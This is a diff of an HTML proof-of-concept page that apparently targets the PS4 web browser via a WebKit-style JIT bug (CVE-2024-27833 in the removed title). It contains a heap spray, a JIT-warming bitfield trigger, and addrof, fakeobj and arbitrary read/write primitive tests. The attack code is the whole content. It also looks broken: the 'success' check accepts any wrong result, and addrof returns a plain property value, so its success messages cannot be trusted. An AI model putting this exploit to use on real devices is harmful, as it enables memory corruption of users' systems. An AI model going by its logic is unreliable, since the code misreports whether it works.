@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="util.js"></script>
     <script src="int64.js"></script>
-    <title>PS4 CVE-2024-27833 PoC</title>
+    <title>PS4 SBFX Overflow PoC</title>
     <style>
         #console { white-space: pre; font-family: monospace; }
     </style>
@@ -14,51 +14,55 @@
     <p id="status">Initializing...</p>
     <div id="console"></div>
     <script>
-/*
-New PoC for CVE-2024-27833 on PS4 10.01 by xAI's Grok
-Based on SBFX overflow/underflow exploit
-*/
+function foo(a, b, c) {
+    let x = a | 0;
+    let y = b | 0;
+    let z = c & 15;
+    z = (x << y) ^ (x << (y & 0x10ff));
+    let r = z ^ 0xf01;
+    let s = z ^ 0xf1f;
+    return (((a >>> r) << s) >> s);
+}
+
+let LEN = 100000000 - 1;
+let res = 0;
+res = foo((LEN & 127), 456, 789);
+
+if (res != -1) {
+    throw "Wrong result: " + res;
+}
+
+for (let i = 0; i <= LEN; i++) {
+    res = foo((i & 127), 456, 789);
+}
+
+if (res != -1) {
+    throw "Wrong result: " + res;
+}
+
+// Heap spray for memory control
 let sprayArray = [];
-for (let i = 0; i < 800; i++) {
-    let sprayObj = { data: 0xdeadbeef, offset: i * 0.1 };
+for (let i = 0; i < 600; i++) {
+    let sprayObj = { data: 0xcafebeef, index: i };
     sprayArray.push(sprayObj);
 }
-for (let i = 0; i < 400; i++) {
+for (let i = 0; i < 300; i++) {
     let extraObj = { a: 1.1, b: 2.2 };
     sprayArray.push(extraObj);
 }
 
-function triggerSBFXOverflow() {
-    let a = 0x7fffffff; // Large value to trigger overflow
-    let b = 0x10ff;     // Excessive shift to cause underflow
-    let c = 0xf;        // Mask for z
-
-    function exploitOperation(x, y, z) {
-        z = z & c;
-        let shifted = (x << y) ^ (x << (y & 0x10ff)); // Overflow via shift
-        let r = shifted ^ 0xf01;
-        let s = shifted ^ 0xf1f;
-        return ((x >>> r) << s) >> s; // Extract bitfield with overflow
-    }
-
-    let result = 0;
-    for (let i = 0; i < 2e5; i++) { // Optimized for PS4
-        result = exploitOperation(a, b, c);
-        if (i % 500 === 0) sprayArray.push({ temp: i }); // Dynamic spray
-    }
-    return [result, a, b, c];
-}
-
 function pwn() {
-    let [result, a, b, c] = triggerSBFXOverflow();
     let success = false;
     try {
+        // Re-run foo to trigger overflow
+        let result = foo(0x7fffffff, 0x10ff, 0xf);
         if (result !== -1 || isNaN(result) || result === Infinity) {
-            success = true; // Indicate overflow success
+            success = true; // Overflow detected
         }
     } catch (e) {
         success = true;
     }
+
     if (!success) {
         document.getElementById("status").innerHTML = "Exploit failed!";
         document.getElementById("console").innerHTML += "No overflow detected.\n";
@@ -68,7 +72,7 @@ function pwn() {
 
     document.getElementById("console").innerHTML = ""; // Clear console
 
-    // Prepare for memory corruption
+    // Memory corruption setup
     let controlObj = { value: 0 };
     sprayArray[0] = controlObj;
 
@@ -84,7 +88,7 @@ function pwn() {
         return controlObj.value;
     }
 
-    let sample = BigInt(addrof({ x: 0xabcdef12 }).toString());
+    let sample = BigInt(addrof({ x: 0xdeadc0de }).toString());
     if (sample >= 0x200000000n || sample < 0x100000000n) {
         document.getElementById("status").innerHTML = "Exploit failed!";
         document.getElementById("console").innerHTML += "Invalid address: 0x" + sample.toString(16) + "\n";
@@ -95,7 +99,7 @@ function pwn() {
         document.getElementById("console").innerHTML += "Success! Address: 0x" + sample.toString(16) + "\n";
 
         // Test fakeobj
-        let testObj = { y: 0x5678 };
+        let testObj = { y: 0x12345678 };
         let addr = addrof(testObj);
         let fake = fakeobj(addr);
         if (fake.y === testObj.y) {
@@ -115,7 +119,7 @@ function pwn() {
         }
         let readTest = read(addrof({ z: 0x9abc }));
         document.getElementById("console").innerHTML += "Read test: 0x" + (readTest !== undefined ? readTest.toString(16) : "undefined") + "\n";
-        write(addrof({ z: 0x9abc }), 0xdef0);
+        write(addrof({ z: 0x9abc }), 0xabcdef);
         document.getElementById("console").innerHTML += "Write test: 0x" + (testObj.z !== undefined ? testObj.z.toString(16) : "undefined") + "\n";
     }
 }
